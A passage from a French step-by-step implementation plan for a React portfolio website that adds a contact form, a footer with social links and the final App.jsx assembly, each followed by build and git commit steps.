                <label className="text-xs uppercase tracking-wider text-zinc-500 block mb-2">
                  Message
                </label>
                <textarea
                  name="message"
                  value={form.message}
                  onChange={onChange}
                  placeholder="Votre message..."
                  required
                  rows={5}
                  className="w-full bg-surface border border-divider text-zinc-100 text-sm
                    px-4 py-3 focus:outline-none focus:border-accent transition-colors
                    placeholder:text-zinc-700 resize-none"
                />
              </div>

              {status === 'error' && (
                <p className="text-xs text-critical">
                  Erreur lors de l'envoi. Écrivez-moi directement à jhadleyc@mail.com.
                </p>
              )}

              <button
                type="submit"
                disabled={status === 'sending'}
                className="w-full bg-accent text-bg text-sm font-semibold py-3
                  hover:bg-accent/90 active:scale-[0.99] transition-all duration-150
                  disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {status === 'sending' ? 'Envoi...' : 'Envoyer le message'}
              </button>
            </form>
          )}
        </motion.div>
      </div>
    </section>
  )
}
```

- [ ] **Étape 2 : Mettre à jour `App.jsx` temporaire**

```jsx
import Hero from './components/Hero'
import Profil from './components/Profil'
import Competences from './components/Competences'
import Projets from './components/Projets'
import Contact from './components/Contact'

export default function App() {
  return (
    <>
      <Hero />
      <Profil />
      <Competences />
      <Projets />
      <Contact />
    </>
  )
}
```

- [ ] **Étape 3 : Vérifier**

Run: `npm run build` → doit réussir sans erreur.

- [ ] **Étape 4 : Commit**

```bash
git add src/components/Contact.jsx src/App.jsx
git commit -m "feat: ajouter la section Contact"
```

---

### Task 7 : Footer

**Fichiers :**
- Créer : `src/components/Footer.jsx`

- [ ] **Étape 1 : Créer le composant**

```jsx
import { motion } from 'framer-motion'

export default function Footer() {
  return (
    <footer className="border-t border-divider bg-surface">
      <motion.div
        initial={{ opacity: 0, y: 16 }}
        whileInView={{ opacity: 1, y: 0 }}
        viewport={{ once: true }}
        transition={{ duration: 0.5 }}
        className="max-w-6xl mx-auto px-6 py-8 flex flex-col sm:flex-row items-center justify-between gap-4"
      >
        <p className="text-xs text-zinc-600">
          CHERY Jean-Hadley — SOC Analyst Junior — 2026
        </p>
        <div className="flex items-center gap-6">
          <a
            href="https://www.linkedin.com/in/hadley-chery/"
            target="_blank"
            rel="noopener noreferrer"
            className="text-xs text-zinc-600 hover:text-accent transition-colors"
          >
            LinkedIn
          </a>
          <a
            href="https://github.com/j-Hadley-C"
            target="_blank"
            rel="noopener noreferrer"
            className="text-xs text-zinc-600 hover:text-accent transition-colors"
          >
            GitHub
          </a>
          <a
            href="mailto:jhadleyc@mail.com"
            className="text-xs text-zinc-600 hover:text-accent transition-colors"
          >
            Email
          </a>
        </div>
      </motion.div>
    </footer>
  )
}
```

- [ ] **Étape 2 : Mettre à jour `App.jsx` temporaire**

```jsx
import Hero from './components/Hero'
import Profil from './components/Profil'
import Competences from './components/Competences'
import Projets from './components/Projets'
import Contact from './components/Contact'
import Footer from './components/Footer'

export default function App() {
  return (
    <>
      <Hero />
      <Profil />
      <Competences />
      <Projets />
      <Contact />
      <Footer />
    </>
  )
}
```

- [ ] **Étape 3 : Vérifier**

Run: `npm run build` → doit réussir sans erreur.

- [ ] **Étape 4 : Commit**

```bash
git add src/components/Footer.jsx src/App.jsx
git commit -m "feat: ajouter le pied de page"
```

---

### Task 8 : Assemblage final avec Navbar et dividers

**Fichiers :**
- Modifier : `src/App.jsx` (remplacement complet, dernière fois)

- [ ] **Étape 1 : Remplacer `App.jsx` par la version finale avec Navbar et séparateurs**

```jsx
import Navbar from './components/Navbar'
import Hero from './components/Hero'
import Profil from './components/Profil'
import Competences from './components/Competences'
import Projets from './components/Projets'
import Contact from './components/Contact'
import Footer from './components/Footer'

export default function App() {
  return (
    <div className="min-h-screen bg-bg">
      <Navbar />
      <main>
        <Hero />
        <div className="divider-line" />
        <Profil />
        <div className="divider-line" />
        <Competences />
        <div className="divider-line" />
        <Projets />
        <div className="divider-line" />
        <Contact />
      </main>
      <Footer />
    </div>
  )
}
```

- [ ] **Étape 2 : Vérifier**

Run: `npm run build` → doit réussir sans erreur.

- [ ] **Étape 3 : Commit**

```bash
git add src/App.jsx
git commit -m "feat: assembler toutes les sections avec la navbar"
```

---

### Task 9 : Vérification finale complète

**Fichiers :** aucun

- [ ] **Étape 1 : Build de production complet**

Run: `npm run build`
Résultat attendu : `✓ built in ...` sans aucune erreur.

- [ ] **Étape 2 : Revue visuelle complète dans le navigateur**

Run: `npm run dev`, ouvrir `http://localhost:5173/` (ou le port indiqué s'il diffère du premier portfolio) et vérifier :
- Bannière : fond photo assombri qui zoome lentement, texte lisible, machine à écrire fonctionne
- Menu : Profil / Compétences / Projets / Contact, navigation fonctionne
- Profil : photo affichée, bio lisible, frise à 4 étapes avec flèches rouge→orange, bouton CV fonctionne
- Compétences : 5 cartes avec icône, titre, description
- Projets : accordéon dépliable/repliable, 5 cas, couleurs de gravité correctes (rouge/orange/vert)
- Contact : formulaire utilisable, liens CV/Email/LinkedIn/GitHub présents
- Pied de page : liens fonctionnels

- [ ] **Étape 3 : Commit final si ajustements**

```bash
git add -A
git commit -m "fix: ajustements suite a la revue visuelle du second portfolio"
```

(Ne committer que s'il y a effectivement eu des changements.)
